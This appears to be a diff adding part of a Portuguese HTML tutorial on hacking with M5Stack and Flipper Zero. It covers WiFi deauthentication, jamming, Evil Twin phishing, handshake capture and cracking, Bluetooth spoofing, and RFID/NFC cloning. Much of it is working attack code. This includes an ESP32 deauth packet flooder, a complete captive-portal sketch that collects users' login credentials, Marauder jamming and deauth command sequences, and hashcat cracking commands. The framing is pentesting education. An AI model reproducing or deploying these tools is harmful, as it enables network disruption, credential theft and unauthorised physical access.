+                        <td>ESP32-D0WDQ6, 16MB Flash, 8MB PSRAM, tela touch, bateria 390mAh</td>
+                        <td>Aplicações avançadas, interface touch</td>
+                    </tr>
+                    <tr>
+                        <td>M5StickC</td>
+                        <td>ESP32, 4MB Flash, LCD 80x160, bateria 95mAh, formato compacto</td>
+                        <td>Projetos portáteis, discretos</td>
+                    </tr>
+                    <tr>
+                        <td>M5StickC Plus</td>
+                        <td>ESP32, 4MB Flash, LCD 135x240, bateria 120mAh, formato compacto</td>
+                        <td>Melhor visibilidade em formato compacto</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <h3 id="m5stack-uiflow">Programação com UIFlow</h3>
+            <p>UIFlow é uma plataforma de programação baseada em blocos (semelhante ao Scratch) que facilita a criação de aplicações para M5Stack sem necessidade de conhecimento avançado em programação.</p>
+            
+            <div class="code-block">
+                <pre>
+# Exemplo de código Python gerado pelo UIFlow para um scanner WiFi básico
+from m5stack import *
+from m5ui import *
+from uiflow import *
+import wifiCfg
+import time
+
+lcd.clear()
+lcd.font(lcd.FONT_DejaVu24)
+lcd.print("WiFi Scanner", 85, 10, 0xffffff)
+
+def scan_networks():
+    lcd.font(lcd.FONT_DejaVu18)
+    lcd.print("Escaneando...", 100, 100, 0xffffff)
+    networks = wifiCfg.scan()
+    lcd.clear()
+    lcd.font(lcd.FONT_DejaVu24)
+    lcd.print("Redes WiFi: " + str(len(networks)), 50, 10, 0xffffff)
+    
+    y_pos = 50
+    for net in networks[:8]:  # Mostra até 8 redes
+        ssid = net[0].decode()
+        strength = net[3]
+        security = "🔒" if net[4] else "🔓"
+        lcd.font(lcd.FONT_DejaVu18)
+        lcd.print(security + " " + ssid + " (" + str(strength) + "dBm)", 10, y_pos, 0xffffff)
+        y_pos += 25
+
+btnA.wasPressed(scan_networks)
+scan_networks()  # Executa o scan inicial
+</pre>
+            </div>
+            
+            <p>Passos para usar o UIFlow:</p>
+            <ol>
+                <li>Acesse <a href="https://flow.m5stack.com" target="_blank">flow.m5stack.com</a></li>
+                <li>Coloque seu M5Stack em modo de programação: pressione e segure o botão lateral por 2 segundos</li>
+                <li>Conecte seu M5Stack à rede WiFi para programação sem fio ou via USB</li>
+                <li>Crie seu programa arrastando e soltando blocos ou escrevendo código Python</li>
+                <li>Clique em "Run" para executar o programa ou "Upload" para salvá-lo no dispositivo</li>
+            </ol>
+            
+            <h3 id="m5stack-arduino">Programação com Arduino IDE</h3>
+            <p>Para aplicações mais avançadas de pentesting, a programação via Arduino IDE oferece maior controle e acesso a bibliotecas especializadas:</p>
+            
+            <div class="code-block">
+                <pre>
+// Exemplo de código para deauth attack usando M5Stack
+#include <M5Stack.h>
+#include "WiFi.h"
+#include "esp_wifi.h"
+
+// Estrutura para criar pacotes de deauth
+typedef struct {
+  uint8_t frame_ctrl[2];
+  uint8_t duration[2];
+  uint8_t dest_addr[6];
+  uint8_t source_addr[6];
+  uint8_t bssid[6];
+  uint8_t sequence[2];
+  uint8_t reason[2];
+} __attribute__((packed)) deauth_frame;
+
+uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+uint8_t targetMac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Endereço MAC do alvo
+
+deauth_frame deauthPacket;
+
+void setup() {
+  M5.begin();
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.setTextColor(WHITE);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.println("Deauth Attack Tool");
+  
+  // Configuração do WiFi em modo monitor
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  esp_wifi_start();
+  esp_wifi_set_promiscuous(true);
+  
+  // Preparar pacote de deauth
+  deauthPacket.frame_ctrl[0] = 0xC0;
+  deauthPacket.frame_ctrl[1] = 0x00;
+  deauthPacket.duration[0] = 0x00;
+  deauthPacket.duration[1] = 0x00;
+  
+  // Copiar endereços MAC
+  memcpy(deauthPacket.dest_addr, broadcastMac, 6);
+  memcpy(deauthPacket.source_addr, targetMac, 6);
+  memcpy(deauthPacket.bssid, targetMac, 6);
+  
+  deauthPacket.sequence[0] = 0x00;
+  deauthPacket.sequence[1] = 0x00;
+  deauthPacket.reason[0] = 0x01; // Razão 1: "Unspecified"
+  deauthPacket.reason[1] = 0x00;
+  
+  M5.Lcd.println("Setup concluido");
+  M5.Lcd.println("Botao A: Iniciar ataque");
+  M5.Lcd.println("Botao B: Parar ataque");
+}
+
+bool attacking = false;
+unsigned long lastPacketTime = 0;
+
+void loop() {
+  M5.update();
+  
+  if (M5.BtnA.wasPressed()) {
+    attacking = true;
+    M5.Lcd.fillRect(0, 150, 320, 30, BLACK);
+    M5.Lcd.setCursor(0, 150);
+    M5.Lcd.println("Ataque iniciado...");
+  }
+  
+  if (M5.BtnB.wasPressed()) {
+    attacking = false;
+    M5.Lcd.fillRect(0, 150, 320, 30, BLACK);
+    M5.Lcd.setCursor(0, 150);
+    M5.Lcd.println("Ataque parado");
+  }
+  
+  if (attacking && millis() - lastPacketTime > 100) { // Enviar 10 pacotes por segundo
+    // Enviar pacote de deauth
+    esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false);
+    lastPacketTime = millis();
+    
+    static int count = 0;
+    count++;
+    M5.Lcd.fillRect(0, 180, 320, 30, BLACK);
+    M5.Lcd.setCursor(0, 180);
+    M5.Lcd.printf("Pacotes enviados: %d", count);
+  }
+}</pre>
+            </div>
+            
+            <p>Configuração do Arduino IDE para M5Stack:</p>
+            <ol>
+                <li>Abra o Arduino IDE e vá para Arquivo → Preferências</li>
+                <li>No campo "URLs Adicionais para Gerenciadores de Placas", adicione: <code>https://m5stack.oss-cn-shenzhen.aliyuncs.com/resource/arduino/package_m5stack_index.json</code></li>
+                <li>Vá para Ferramentas → Placa → Gerenciador de Placas</li>
+                <li>Pesquise por "M5Stack" e instale o pacote</li>
+                <li>Selecione a placa apropriada em Ferramentas → Placa → M5Stack</li>
+                <li>Instale as bibliotecas necessárias via Sketch → Incluir Biblioteca → Gerenciar Bibliotecas</li>
+            </ol>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Dica Profissional</h4>
+                <p>Para aplicações de pentesting WiFi, recomenda-se usar modelos com maior capacidade de bateria como o M5Stack Core2. Também é útil ter um módulo de bateria adicional para operações prolongadas em campo.</p>
+            </div>
+        </section>
+
+        <section id="wifi" class="content-section">
+            <h2>Hacking WiFi</h2>
+            <p>O Flipper Zero não possui capacidade WiFi nativa, mas pode ser expandido com módulos externos. Já o M5Stack tem WiFi integrado, tornando-o ideal para testes de segurança sem fio.</p>
+            
+            <h3 id="wifi-marauder">ESP32 Marauder no Flipper Zero</h3>
+            <p>O ESP32 Marauder é um firmware para ESP32 que, quando conectado ao Flipper Zero, transforma-o em uma poderosa ferramenta de pentesting WiFi.</p>
+            
+            <div class="code-block">
+                <pre>
+# Instalação do ESP32 Marauder com Flipper Zero
+
+1. Obtenha um módulo ESP32 compatível (ESP32-S2, ESP32 WROOM, etc.)
+2. Conecte o ESP32 ao Flipper Zero usando o cabo adaptador:
+   - 3.3V do Flipper -> 3.3V do ESP32
+   - GND do Flipper -> GND do ESP32
+   - TX do Flipper -> RX do ESP32
+   - RX do Flipper -> TX do ESP32
+
+3. Instale o firmware Marauder no ESP32:
+   a. Baixe o firmware em https://github.com/justcallmekoko/ESP32Marauder/releases
+   b. Use a ferramenta web flasher em https://marauder.xyz/wifi ou esptool.py
+   c. Para esptool.py, use o comando:
+      esptool.py --port [PORTA] --baud 115200 write_flash 0x10000 [ARQUIVO_FIRMWARE]
+
+4. Instale o aplicativo "WiFi Marauder" no Flipper Zero:
+   a. Baixe o arquivo .fap em https://github.com/0xchocolate/flipperzero-firmware-with-wifi-marauder-companion
+   b. Copie para o cartão SD do Flipper no diretório /apps/GPIO/
+   c. Ou instale via qFlipper ou Flipper Mobile App
+
+5. Conecte o ESP32 e inicie o aplicativo no Flipper Zero:
+   Navegue para: GPIO -> WiFi Marauder</pre>
+            </div>
+            
+            <p>Comandos básicos do Marauder no Flipper Zero:</p>
+            <ul>
+                <li><strong>scan ap</strong>: Escaneia redes WiFi nas proximidades</li>
+                <li><strong>select ap [número]</strong>: Seleciona uma rede para alvo</li>
+                <li><strong>attack deauth</strong>: Inicia um ataque de desautenticação na rede selecionada</li>
+                <li><strong>attack deauth -s</strong>: Para o ataque de desautenticação</li>
+                <li><strong>sniff pmkid</strong>: Captura handshakes PMKID</li>
+                <li><strong>sniff pmkid -s</strong>: Para a captura de PMKID</li>
+                <li><strong>sniff beacon</strong>: Captura beacon frames</li>
+                <li><strong>sniff beacon -s</strong>: Para a captura de beacons</li>
+                <li><strong>list ap</strong>: Lista as redes encontradas</li>
+                <li><strong>list station</strong>: Lista os dispositivos conectados às redes</li>
+                <li><strong>clearlist ap</strong>: Limpa a lista de APs</li>
+                <li><strong>setting defaultwifichannel [canal]</strong>: Define o canal WiFi padrão</li>
+                <li><strong>setting scantime [tempo em ms]</strong>: Define o tempo de escaneamento</li>
+            </ul>
+            
+            <h3 id="wifi-deauth">Ataques de Deauth</h3>
+            <p>O ataque de desautenticação força dispositivos a se desconectarem de uma rede WiFi, permitindo capturar handshakes ou testar a segurança.</p>
+            
+            <div class="code-block">
+                <pre>
+# No ESP32 Marauder com Flipper Zero:
+scan ap                 # Escaneia redes WiFi
+select ap 2             # Seleciona a rede #2 da lista
+attack deauth           # Inicia o ataque de desautenticação
+attack deauth -s        # Para o ataque
+
+# Com M5Stack (código Arduino):
+// Configuração no setup()
+esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+
+// Na função de ataque
+void sendDeauth(uint8_t* targetMAC, uint8_t* gatewayMAC) {
+  uint8_t packet[26] = {
+    0xC0, 0x00,                   // Tipo e subtipo (deauth)
+    0x00, 0x00,                   // Duração
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Endereço de destino (broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Endereço de origem (BSSID)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID
+    0x00, 0x00,                   // Número de sequência
+    0x01, 0x00                    // Razão (1 = não especificada)
+  };
+  
+  // Preencher endereços MAC
+  memcpy(&packet[10], gatewayMAC, 6);
+  memcpy(&packet[16], gatewayMAC, 6);
+  
+  // Enviar pacote
+  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+}</pre>
+            </div>
+            
+            <h3 id="wifi-jamming">Jamming de 2.4GHz e 5GHz</h3>
+            <p>O jamming de sinais WiFi pode ser realizado para testes de resiliência de sistemas ou como parte de avaliações de segurança.</p>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> Aviso Legal</h4>
+                <p>O jamming de sinais WiFi é ilegal na maioria dos países e pode interferir com serviços críticos. Estas técnicas só devem ser usadas em ambientes controlados e isolados com autorização explícita.</p>
+            </div>
+            
+            <div class="code-block">
+                <pre>
+# Jamming no ESP32 Marauder (Flipper Zero):
+setting beaconinterval 10      # Define intervalo curto para beacons
+attack beacon spam -c          # Inicia spam de beacons (ocupando o espectro)
+attack beacon spam -s          # Para o ataque
+
+# Jamming seletivo em canais específicos:
+setting defaultwifichannel 6   # Escolhe o canal 6
+attack deauth                  # Inicia deauth nesse canal
+# Repita para diferentes canais ou use:
+attack deauth -c               # Ataque em todos os canais
+
+# Jamming 5GHz (requer hardware compatível):
+setting support5ghz true       # Habilita suporte a 5GHz
+setting defaultwifichannel 36  # Escolhe o canal 36 (5GHz)
+attack deauth                  # Inicia deauth no canal 5GHz
+</pre>
+            </div>
+            
+            <h3 id="wifi-evil">Redes Evil Twin</h3>
+            <p>As redes Evil Twin são redes falsas que imitam redes legítimas para capturar credenciais ou dados. Esta técnica é usada em testes de conscientização sobre segurança.</p>
+            
+            <div class="code-block">
+                <pre>
+# Evil Twin com ESP32 Marauder (Flipper Zero):
+scan ap                      # Escaneia redes WiFi
+select ap 2                  # Seleciona a rede a ser clonada
+attack beacon -c             # Inicia clone de beacons da rede
+setting ssid "NomeDeRedeAlvo"  # Define SSID manualmente
+setting channel 6            # Define canal da rede falsa
+attack ap                    # Cria ponto de acesso falso
+
+# Configurando captive portal:
+attack captiveportal -c      # Inicia captive portal para capturar credenciais
+attack captiveportal -s      # Para o captive portal
+update portal index.html     # Atualiza a página do portal
+
+# Verificando credenciais capturadas:
+list credentials             # Mostra credenciais capturadas</pre>
+            </div>
+            
+            <p>Para criar um Evil Twin mais avançado com M5Stack:</p>
+            <div class="code-block">
+                <pre>
+// Código simplificado para Evil Twin com M5Stack
+#include <M5Stack.h>
+#include <WiFi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 4, 1);
+DNSServer dnsServer;
+WebServer webServer(80);
+
+String targetSSID = "Rede-Alvo";
+String credentialsLog = "";
+bool attackRunning = false;
+
+void setup() {
+  M5.begin();
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setTextColor(WHITE);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.println("Evil Twin Attack Tool");
+  M5.Lcd.println("A: Iniciar ataque");
+  M5.Lcd.println("B: Parar ataque");
+  M5.Lcd.println("C: Ver credenciais");
+}
+
+void startAttack() {
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(targetSSID);
+  
+  dnsServer.start(DNS_PORT, "*", apIP);
+  
+  webServer.onNotFound([]() {
+    String content = "<html><body><h1>Conexão Wi-Fi Interrompida</h1>";
+    content += "<p>Por favor, entre com suas credenciais para restaurar a conexão.</p>";
+    content += "<form action='/login' method='post'>";
+    content += "Login: <input type='text' name='username'><br>";
+    content += "Senha: <input type='password' name='password'><br>";
+    content += "<input type='submit' value='Conectar'></form></body></html>";
+    webServer.send(200, "text/html", content);
+  });
+  
+  webServer.on("/login", HTTP_POST, []() {
+    String username = webServer.arg("username");
+    String password = webServer.arg("password");
+    
+    // Salva as credenciais
+    credentialsLog += "Usuario: " + username + " | Senha: " + password + "\n";
+    
+    String content = "<html><body><h1>Conectando...</h1>";
+    content += "<p>Por favor, aguarde enquanto processamos sua solicitação.</p>";
+    content += "<meta http-equiv='refresh' content='5;url=/'></body></html>";
+    webServer.send(200, "text/html", content);
+  });
+  
+  webServer.begin();
+  attackRunning = true;
+  
+  M5.Lcd.fillRect(0, 150, 320, 90, BLACK);
+  M5.Lcd.setCursor(0, 150);
+  M5.Lcd.println("Ataque iniciado!");
+  M5.Lcd.println("AP: " + targetSSID);
+  M5.Lcd.println("IP: 192.168.4.1");
+}
+
+void stopAttack() {
+  webServer.stop();
+  dnsServer.stop();
+  WiFi.softAPdisconnect(true);
+  attackRunning = false;
+  
+  M5.Lcd.fillRect(0, 150, 320, 90, BLACK);
+  M5.Lcd.setCursor(0, 150);
+  M5.Lcd.println("Ataque interrompido");
+}
+
+void showCredentials() {
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.println("Credenciais capturadas:");
+  M5.Lcd.println();
+  
+  if (credentialsLog == "") {
+    M5.Lcd.println("Nenhuma credencial capturada");
+  } else {
+    M5.Lcd.setTextSize(1);
+    M5.Lcd.println(credentialsLog);
+    M5.Lcd.setTextSize(2);
+  }
+  
+  M5.Lcd.println("\nC: Voltar ao menu");
+}
+
+void loop() {
+  M5.update();
+  
+  if (M5.BtnA.wasPressed()) {
+    startAttack();
+  }
+  
+  if (M5.BtnB.wasPressed()) {
+    stopAttack();
+  }
+  
+  if (M5.BtnC.wasPressed()) {
+    if (attackRunning) {
+      showCredentials();
+      while (!M5.BtnC.wasPressed()) {
+        M5.update();
+        delay(10);
+      }
+      
+      // Restaura a tela principal
+      M5.Lcd.fillScreen(BLACK);
+      M5.Lcd.setCursor(0, 0);
+      M5.Lcd.println("Evil Twin Attack Tool");
+      M5.Lcd.println("A: Iniciar ataque");
+      M5.Lcd.println("B: Parar ataque");
+      M5.Lcd.println("C: Ver credenciais");
+      
+      if (attackRunning) {
+        M5.Lcd.setCursor(0, 150);
+        M5.Lcd.println("Ataque em andamento!");
+        M5.Lcd.println("AP: " + targetSSID);
+        M5.Lcd.println("IP: 192.168.4.1");
+      }
+    }
+  }
+  
+  if (attackRunning) {
+    dnsServer.processNextRequest();
+    webServer.handleClient();
+  }
+}</pre>
+            </div>
+            
+            <h3 id="wifi-handshake">Captura de Handshakes</h3>
+            <p>A captura de handshakes WPA/WPA2 é uma etapa crucial para testes de segurança de senha em redes WiFi.</p>
+            
+            <div class="code-block">
+                <pre>
+# Captura de handshakes com ESP32 Marauder (Flipper Zero):
+scan ap                      # Escaneia redes WiFi
+select ap 2                  # Seleciona a rede alvo
+attack deauth                # Inicia ataque de desautenticação para forçar reconexões
+sniff pmkid                  # Inicia captura de handshakes PMKID
+# ou
+sniff raw                    # Captura de pacotes brutos para análise posterior
+
+# Após alguns segundos:
+attack deauth -s             # Para o ataque de desautenticação
+sniff pmkid -s               # Para a captura
+
+# Salvando os dados capturados:
+save pmkid handshake.pcap    # Salva no formato pcap
+save pmkid handshake.hccapx  # Salva no formato hccapx (para Hashcat)
+
+# Verificando handshakes capturados:
+list handshakes              # Lista os handshakes obtidos</pre>
+            </div>
+            
+            <h3 id="wifi-bruteforce">Ataques de Força Bruta</h3>
+            <p>Após capturar handshakes, é possível realizar ataques de força bruta para testar a segurança das senhas. O Flipper Zero e M5Stack não são potentes o suficiente para quebrar senhas complexas diretamente, mas podem ser usados para capturar os dados necessários.</p>
+            
+            <div class="code-block">
+                <pre>
+# Transferindo capturas para computador para uso com ferramentas de quebra:
+
+# No Flipper Zero:
+1. Conecte o Flipper Zero ao computador via USB
+2. Acesse o armazenamento e copie os arquivos .pcap ou .hccapx
+
+# Usando Hashcat para quebrar senhas (no computador):
+hashcat -m 16800 handshake.hccapx wordlist.txt         # Para PMKID
+hashcat -m 2500 handshake.hccapx wordlist.txt          # Para WPA/WPA2
+hashcat -m 2500 handshake.hccapx -a 3 ?d?d?d?d?d?d?d?d # Força bruta com dígitos
+
+# Comando para usar regras de transformação:
+hashcat -m 2500 handshake.hccapx wordlist.txt -r rules/best64.rule</pre>
+            </div>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Dica Profissional</h4>
+                <p>Para maior eficiência, use o Flipper Zero com ESP32 Marauder para capturar handshakes em campo, e depois transfira os arquivos para um computador com GPU potente para realizar os ataques de força bruta com Hashcat.</p>
+            </div>
+        </section>
+
+        <section id="bluetooth" class="content-section">
+            <h2>Hacking Bluetooth</h2>
+            <p>O Bluetooth é amplamente utilizado em dispositivos IoT, wearables, e sistemas de controle. Testar a segurança desses sistemas é fundamental para identificar vulnerabilidades.</p>
+            
+            <h3 id="bluetooth-scan">Escaneamento e Reconhecimento</h3>
+            <p>O primeiro passo para testar a segurança Bluetooth é escanear e identificar dispositivos próximos.</p>
+            
+            <div class="code-block">
+                <pre>
+# No M5Stack com código Arduino:
+#include <M5Stack.h>
+#include <BLEDevice.h>
+#include <BLEScan.h>
+#include <BLEAdvertisedDevice.h>
+
+int scanTime = 5; // Tempo de scan em segundos
+BLEScan* pBLEScan;
+
+class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
+  void onResult(BLEAdvertisedDevice advertisedDevice) {
+    M5.Lcd.printf("Dispositivo: %s \n", advertisedDevice.toString().c_str());
+  }
+};
+
+void setup() {
+  M5.begin();
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.setTextColor(WHITE);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.println("Scanner Bluetooth");
+  
+  BLEDevice::init("");
+  pBLEScan = BLEDevice::getScan();
+  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
+  pBLEScan->setActiveScan(true);
+  pBLEScan->setWindow(99);
+  pBLEScan->setInterval(100);
+}
+
+void loop() {
+  M5.update();
+  
+  if (M5.BtnA.wasPressed()) {
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setCursor(0, 0);
+    M5.Lcd.println("Escaneando...");
+    
+    BLEScanResults foundDevices = pBLEScan->start(scanTime, false);
+    
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setCursor(0, 0);
+    M5.Lcd.printf("Dispositivos encontrados: %d\n", foundDevices.getCount());
+    
+    for (int i = 0; i < foundDevices.getCount(); i++) {
+      BLEAdvertisedDevice device = foundDevices.getDevice(i);
+      M5.Lcd.printf("%d. %s\n", i+1, device.getName().c_str());
+      M5.Lcd.printf("   RSSI: %d\n", device.getRSSI());
+      
+      if (device.haveManufacturerData()) {
+        M5.Lcd.println("   Tem dados do fabricante");
+      }
+      
+      if (device.haveTXPower()) {
+        M5.Lcd.printf("   TX Power: %d\n", device.getTXPower());
+      }
+      
+      if (device.haveServiceUUID()) {
+        M5.Lcd.println("   Tem UUID de serviço");
+      }
+      
+      M5.Lcd.println();
+    }
+    
+    pBLEScan->clearResults();
+  }
+}</pre>
+            </div>
+            
+            <h3 id="bluetooth-sniff">Sniffing de Pacotes</h3>
+            <p>Para análise mais profunda, é possível capturar e analisar o tráfego Bluetooth.</p>
+            
+            <div class="code-block">
+                <pre>
+# Sniffing Bluetooth com ESP32 (M5Stack):
+// Precisamos de hardware adicional como Ubertooth One ou um adaptador BT compatível
+// para análise mais detalhada.
+
+// Exemplo simplificado para registro de interações BLE:
+#include <M5Stack.h>
+#include <BLEDevice.h>
+#include <BLEServer.h>
+#include <BLEUtils.h>
+#include <BLE2902.h>
+
+class MyServerCallbacks: public BLEServerCallbacks {
+  void onConnect(BLEServer* pServer) {
+    M5.Lcd.println("Dispositivo conectado");
+  }
+  
+  void onDisconnect(BLEServer* pServer) {
+    M5.Lcd.println("Dispositivo desconectado");
+  }
+};
+
+class MyCharacteristicCallbacks: public BLECharacteristicCallbacks {
+  void onWrite(BLECharacteristic *pCharacteristic) {
+    std::string value = pCharacteristic->getValue();
+    M5.Lcd.print("Valor recebido: ");
+    for (int i = 0; i < value.length(); i++) {
+      M5.Lcd.print(value[i], HEX);
+      M5.Lcd.print(" ");
+    }
+    M5.Lcd.println();
+  }
+  
+  void onRead(BLECharacteristic *pCharacteristic) {
+    M5.Lcd.println("Característica lida pelo cliente");
+  }
+};
+
+// Usar este código para criar um servidor BLE que registra
+// todas as interações para análise de segurança</pre>
+            </div>
+            
+            <h3 id="bluetooth-spoofing">MAC Spoofing</h3>
+            <p>Para testar a resiliência contra ataques de spoofing, é possível imitar identidades de dispositivos Bluetooth legítimos.</p>
+            
+            <div class="code-block">
+                <pre>
+# MAC Spoofing com ESP32 (M5Stack):
+#include <M5Stack.h>
+#include <esp_bt.h>
+#include <esp_bt_main.h>
+#include <esp_bt_device.h>
+
+void setup() {
+  M5.begin();
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.setTextColor(WHITE);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.println("Bluetooth MAC Spoofing");
+  
+  // Inicializa Bluetooth
+  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+  esp_bt_controller_init(&bt_cfg);
+  esp_bt_controller_enable(ESP_BT_MODE_BTDM);
+  esp_bluedroid_init();
+  esp_bluedroid_enable();
+  
+  // Mostra endereço MAC atual
+  const uint8_t* currentMAC = esp_bt_dev_get_address();
+  M5.Lcd.println("MAC atual:");
+  for (int i = 0; i < 6; i++) {
+    M5.Lcd.printf("%02X", currentMAC[i]);
+    if (i < 5) M5.Lcd.print(":");
+  }
+  M5.Lcd.println();
+  
+  // Define novo endereço MAC (spoofing)
+  uint8_t newMAC[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
+  esp_bt_dev_set_device_name("SpoofedDevice");
+  // Note: a API ESP32 não permite alterar o endereço MAC diretamente
+  // em tempo de execução. Este é um exemplo conceitual.
+  
+  M5.Lcd.println("\nA: Iniciar Scan");
+  M5.Lcd.println("B: Iniciar Spoof");
+  M5.Lcd.println("C: Parar Spoof");
+}</pre>
+            </div>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> Limitação Técnica</h4>
+                <p>Por razões de segurança, o ESP32 tem limitações para alteração do endereço MAC Bluetooth em tempo de execução. Para testes avançados de spoofing, considere o uso de hardware especializado como o Ubertooth One.</p>
+            </div>
+        </section>
+
+        <section id="rfid" class="content-section">
+            <h2>RFID e NFC</h2>
+            <p>O Flipper Zero suporta leitura, emulação e clonagem de diversos cartões RFID (125kHz) e NFC (13.56MHz), tornando-o uma ferramenta poderosa para testes de segurança de controle de acesso físico.</p>
+            
+            <h3 id="rfid-leitura">Leitura de Cartões</h3>
+            <p>O primeiro passo para trabalhar com RFID/NFC é a leitura e identificação dos cartões.</p>
+            
+            <div class="code-block">
+                <pre>
+# Leitura de cartões RFID no Flipper Zero
+
+## RFID 125kHz (EM4100, HID, Indala):
+1. Navegue para: RFID -> Read
+2. Aproxime o cartão da parte superior do Flipper Zero
+3. Aguarde o sinal sonoro e a vibração indicando a leitura bem-sucedida
+4. O Flipper exibirá o tipo de cartão e seu ID único
+5. Pressione o botão direito para ver mais detalhes
+6. Salve o cartão pressionando o botão central (OK) e dando um nome
+
+## NFC 13.56MHz (MIFARE Classic, Ultralight, etc.):
+1. Navegue para: NFC -> Read
+2. Aproxime o cartão da parte superior do Flipper Zero
+3. O Flipper tentará identificar o tipo de cartão
+4. Se for compatível, exibirá informações como UID, ATQA, SAK
+5. Para MIFARE Classic, tentará ler os setores usando chaves conhecidas
+6. Salve o cartão pressionando o botão central (OK) e dando um nome</pre>
+            </div>
+            
+            <p>Tipos de cartões suportados pelo Flipper Zero:</p>
+            <ul>
+                <li><strong>RFID 125kHz:</strong> EM4100, EM4102, HID ProxCard, Indala</li>
+                <li><strong>NFC 13.56MHz:</strong> MIFARE Classic, MIFARE Ultralight, NTAG, algumas tags EMV, alguns cartões de transporte</li>
+            </ul>
+            
+            <h3 id="rfid-emulação">Emulação de Cartões</h3>
+            <p>Uma vez que o cartão foi lido e salvo, o Flipper Zero pode emular seu funcionamento.</p>
+            
+            <div class="code-block">
+                <pre>
+# Emulação de cartões no Flipper Zero
+
+## Emulação RFID 125kHz:
+1. Navegue para: RFID -> Saved
+2. Selecione o cartão que deseja emular
+3. Escolha "Emulate" no menu
+4. Aproxime o Flipper Zero do leitor de cartões
+5. O cartão será emulado até que você pressione o botão traseiro
+
+## Emulação NFC 13.56MHz (limitado):
+1. Navegue para: NFC -> Saved
+2. Selecione o cartão que deseja emular
+3. Escolha "Emulate" no menu
+4. Aproxime o Flipper Zero do leitor
+5. Alguns cartões NFC não podem ser completamente emulados devido a limitações de hardware 
+   ou proteções de segurança</pre>
+            </div>
+            
+            <p>Limitações importantes de emulação:</p>
+            <ul>
+                <li>Cartões MIFARE Classic protegidos com autenticação não podem ser completamente emulados sem as chaves</li>
+                <li>Cartões com criptografia avançada como DESFire, HID iClass, ou cartões bancários não podem ser emulados</li>
+                <li>A emulação funciona melhor com cartões simples como EM4100 ou MIFARE Ultralight</li>
+            </ul>
+            
+            <h3 id="rfid-clonagem">Clonagem de Cartões</h3>
+            <p>Para cartões compatíveis, o Flipper Zero pode gravar os dados lidos em cartões graváveis em branco.</p>
+            
+            <div class="code-block">
+                <pre>
+# Clonagem de cartões no Flipper Zero
+
+## Clonagem RFID 125kHz:
+1. Primeiro, leia o cartão original como descrito anteriormente
+2. Navegue para: RFID -> Saved
+3. Selecione o cartão que deseja clonar
+4. Escolha "Write" no menu
+5. Aproxime um cartão T5577/T5557 gravável do Flipper Zero
+6. Aguarde a conclusão da gravação
+7. Teste o cartão clonado no leitor original
+
+## Clonagem NFC 13.56MHz:
+1. Primeiro, leia o cartão original e salve-o
+2. Navegue para: NFC -> Saved
+3. Selecione o cartão que deseja clonar
+4. Escolha "Write" no menu
+5. Aproxime um cartão compatível em branco (MIFARE Classic/Ultralight gravável)
+6. Alguns cartões têm proteções que impedem a clonagem completa</pre>
+            </div>
+            
+            <p>Cartões graváveis compatíveis:</p>
+            <ul>
+                <li><strong>RFID 125kHz:</strong> T5577, T5557, EM4305</li>
+                <li><strong>NFC 13.56MHz:</strong> MIFARE Classic "Magic Cards", MIFARE Ultralight em branco, NTAG21x em branco</li>
+            </ul>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Dica Profissional</h4>
+                <p>As "Magic Cards" são cartões MIFARE Classic especiais que podem ser gravados com qualquer UID, contornando a proteção que impede a alteração do UID em cartões normais. São excelentes para testes de segurança.</p>
+            </div>
+            
+            <h3 id="rfid-bruteforce">Brute Force de Chaves</h3>
+            <p>Para cartões MIFARE Classic protegidos, o Flipper Zero pode tentar quebrar as chaves de acesso.</p>
+            
+            <div class="code-block">
+                <pre>
+# Brute Force de chaves MIFARE Classic no Flipper Zero
+
+1. Navegue para: NFC -> Mf Classic Tool
+2. Escolha "Read with Key Dictionary"
+3. Aproxime o cartão MIFARE Classic
+4. O Flipper tentará todas as chaves em seu dicionário para acessar os setores protegidos
+5. O processo pode levar vários minutos dependendo do tamanho do dicionário
+
+# Adicionando chaves personalizadas:
+1. Conecte o Flipper Zero ao computador
+2. Acesse a pasta /nfc/assets/mf_classic_dict.nfc
